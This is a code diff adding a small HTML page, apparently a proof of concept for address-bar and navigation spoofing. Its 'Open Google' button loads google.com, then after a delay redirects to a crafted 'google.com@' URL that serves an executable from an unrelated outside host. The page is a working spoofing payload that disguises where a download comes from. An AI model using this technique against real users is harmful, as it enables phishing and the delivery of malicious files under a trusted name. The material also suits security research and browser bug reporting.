@@ -1,0 +1,17 @@
+<html>
+<head>
+    <title>Address Bar & navigation protocol Spoof!</title>
+    <script>
+        function redirectToGoogle() {
+            var popup = window.open('https://google.com', '_self');
+            setTimeout(function() {
+                popup.location.replace('https://google.com@http://pub.agrarix.net/Windows/7-zip/7z922.exe');
+            }, 2000);
+        }
+    </script>
+</head>
+<body>
+    <button onclick="redirectToGoogle()">Open Google</button>
+    <p id="message"></p>
+</body>
+</html>
